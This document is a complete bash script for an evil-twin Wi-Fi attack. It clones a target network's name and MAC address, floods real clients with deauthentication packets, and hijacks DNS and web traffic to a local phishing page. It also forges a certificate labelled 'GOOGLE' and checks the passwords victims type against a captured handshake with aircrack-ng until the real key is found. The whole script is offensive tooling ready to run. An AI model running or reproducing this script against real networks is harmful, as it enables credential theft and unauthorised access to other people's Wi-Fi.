#!/bin/bash
workingpath=$(pwd)
scriptpath=`pwd`
sed  's/ //' paramet.txt >parameters1.txt
interface=`awk '{if(NR==4) print $0}' parameters1.txt `
ssid=`awk '{if(NR==1) print $0}' paramet.txt `
channel=`awk '{if(NR==3) print $0}' parameters1.txt `
bssid=`awk '{if(NR==2) print $0}' parameters1.txt `
workingpath=`awk '{if(NR==6) print $0}' parameters1.txt `
ssl=`awk '{if(NR==5) print $0}' parameters1.txt `
handshakep=`awk '{if(NR==7) print $0}' paramet.txt `
resultpath=`awk '{if(NR==8) print $0}' paramet.txt `
grepmiddle=`echo $bssid | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
grepmiddle="${grepmiddle//:}"
macmanufacturer=`grep -i "$grepmiddle" "$scriptpath/oui.txt" | cut -f 3`
echo "essid : $ssid " > "$scriptpath/server/parameters.txt"
echo "vendor : $macmanufacturer " >> "$scriptpath/server/parameters.txt"
killall dnsmasq 2>debug
killall dhcpd  2>debug
killall apache2 2>debug
killall hostapd 2>debug
killall dnsspoof 2>debug
killall dnsspoof 2>debug
killall lighttpd 2>debug
killall airedump-ng 2>debug
killall mdk3 2>debug
killall aircrack-ng 2>debug
APmac=`echo $bssid |cut -d: -f 1,2,3,4,5 `  2>/dev/null
mssid=`echo "$APmac:AA"` 2>/dev/null
mssid=`echo $mssid` 2>/dev/null
iw dev $interface interface add soyalk type monitor 
##define colors
# Bold-text+colors
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Regular Colors

Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

center1 (){
termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  -{1..500})"
  printf $BGreen'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
  }
center2 (){
termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  '*'{1..500})"
  printf $BGreen'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
  }
  
echo "\
interface="$interface"
driver=nl80211
ssid="$ssid"
channel="$channel"


" >hostapd.conf 
echo "\
no-resolv
interface=$interface
dhcp-range=192.168.1.2,192.168.1.255,12h
address=/google.com/216.58.201.164
address=/connectivitycheck.gstatic.com/216.58.201.163
address=/clients3.google.com/216.58.211.46
address=/captive.apple.com/17.253.109.201
address=/connectivitycheck.android.com/216.58.211.238
address=/gstatic.com/216.58.214.163
address=/www.apple.com/104.121.11.119
address=/msftconnecttest.com/104.215.95.187
address=/#/192.168.1.1 
" >dnsmasq.conf

echo "\
server.document-root = \"$scriptpath/server/\"

server.modules = (
	\"mod_access\",
	\"mod_fastcgi\",
	\"mod_alias\",
	\"mod_accesslog\",
	\"mod_redirect\",
	\"mod_rewrite\"
)
accesslog.filename = \"$scriptpath/lighttpd.log\"


fastcgi.server = (
    \".php\" => (
        (
            \"bin-path\" => \"/usr/bin/php-cgi\",
            \"socket\" => \"$scriptpath/php.socket\"
        )
    )
)

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
	\".html\" => \"text/html\",
	\".htm\" => \"text/html\",
	\".txt\" => \"text/plain\",
	\".jpg\" => \"image/jpeg\",
	\".png\" => \"image/png\",
	\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = (
	\".fcgi\",
	\".php\",
	\".rb\",
	\"~\",
	\".inc\"
)

index-file.names = (
	\"index.htm\",
	\"index.html\",
    \"index.php\"
)
" >"lighttpd.conf"


  if [ "$ssl" = 1 ]; then
xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=GOOGLE/O=GOOGLE/OU=GOOGLE/C=MA' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout cert.pem -out cert.pem
cp "cert.pem" -r "$scriptpath/server/cert.pem"
 echo "\
\$SERVER[\"socket\"] == \":443\" {
	ssl.engine = \"enable\"
	ssl.pemfile = \"cert.pem\"
}
" >>"lighttpd.conf"

fi



rmfilestwin (){
      rm -rf "$scriptpath/lighttpd.conf"
      rm -rf "$scriptpath/hostapd.conf"
      rm -rf "$scriptpath/dnsmasq.conf"
      rm -rf "$scriptpath/php.socket-*"
      kill $PID1 && kill $PID2 && kill $PID3 && kill $PID4 && kill $PID5 &>/dev/null
      killall xterm hostapd lighttpd  
      
      
      }
      checkandclient() {

 
      while [ 1 ] ; do

      aircrack-ng   -w "$scriptpath/server/attempts.txt" -b "$bssid" "$handshakep" -l "$resultpath/PASSWORD-OF-$ssid.txt" &>/dev/null
      aircrack-ng   -w server/attempts.txt -b "$bssid" "$handshakep" -l "PASSWORD-OF-$bssid.txt"  &>/dev/null 
      
      if [ -f "PASSWORD-OF-$bssid.txt" ]; then
     kill $PID1 $PID2 $PID3 $PID4 $PID5 $PID6 $PID7 $PID8 &>/dev/null
     xterm -hold  "#000000" -fg "#FFFFFF" -title "probalk AIRCRACK-NG" -e   aircrack-ng   -w "$scriptpath/server/attempts.txt" -b "$bssid" "$handshakep"  

  break
      fi
      done
      
      }
      
    livecl() {

	liveclients=`nmap -sP 192.168.1.1/24  | grep "host up"  |cut -d " " -f 6` &>/dev/null
	liveclients=`echo "${liveclients//(}"`	
	
	
	}
    repeatandkill () {
    echo 
    
while [ 1 ] ; do
clear
viewed=0
if [ -f "$scriptpath/server/viewed.txt" ]; then
viewed=`cat "$scriptpath/server/viewed.txt"` 2>/dev/null
viewed=`expr $viewed / 2 ` 2>/dev/null
fi
center2 "*"
echo -e "$BGreen ESSID        : $Cyan $ssid "
echo -e "$BGreen BSSID        : $Cyan $bssid "
echo -e "$BGreen CHANNEL      : $Cyan $channel "
echo -e "$BGreen PAGE LOADED  : $Yellow $viewed "
echo -e "$BGreen LIVE CLIENTS : $Yellow $liveclients "

center2 "*"
 if [ -f "$scriptpath/server/pwds.txt" ]; then
column -t -s'<#>' "$scriptpath/server/pwds.txt" | cut -d ";" -f 1,2,3 > "$scriptpath/server/pwds2.txt"
while read p ;
do
echo "$p"
center1 "-"

done <"$scriptpath/server/pwds2.txt"
fi
sleep 1
done   

}   
    
    
ifconfig $interface down
macchanger -m $mssid $interface
ifconfig $interface up
xterm -hold -geometry "90x20+900+0" -bg "#000000" -fg "#FFFFFF" -title "probalk AP Service [hostapd]" -e " hostapd hostapd.conf" & PID1=$!
sleep 3
service isc-dhcp-server stop
echo "$bssid" > blacklist


ifconfig $interface up  192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw  192.168.1.1

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
	iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.1:53
	iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
	iptables -t nat -A POSTROUTING -j MASQUERADE
	iptables --table nat --append POSTROUTING --out-interface $interface -j ACCEPT
sleep 1
xterm -hold -geometry "90x20+900+900" -bg "#000000" -fg "#FFFFFF" -title "probalk  Lighttpd WEB SERVER" -e  "lighttpd -f  lighttpd.conf "  & PID3=$!
xterm -hold -geometry "90x20+0+0" -bg "#000000" -fg "#FFFFFF" -title "probalk DNSMASQ" -e  "  dnsmasq -C dnsmasq.conf -d  "  & PID2=$!
echo 1 >/proc/sys/net/ipv4/ip_forward
sleep 1
xterm -hold  -geometry "90x20+0+900" -bg "#000000" -fg "#FFFFFF" -title "Probalk Deauth With MDK3  " -e "mdk3 soyalk d -b blacklist -c $channel" & PID8=$!

repeatandkill  & PID6=$!
checkandclient  & PID7=$! &>/dev/null
livecl  & PID9=$! &>/dev/null
trap rmfilestwin SIGINT SIGTERM SIGHUP


wait $PID1 $PID2 $PID3 $PID4 $PID5 $PID6 $PID7 $PID8 $PID9





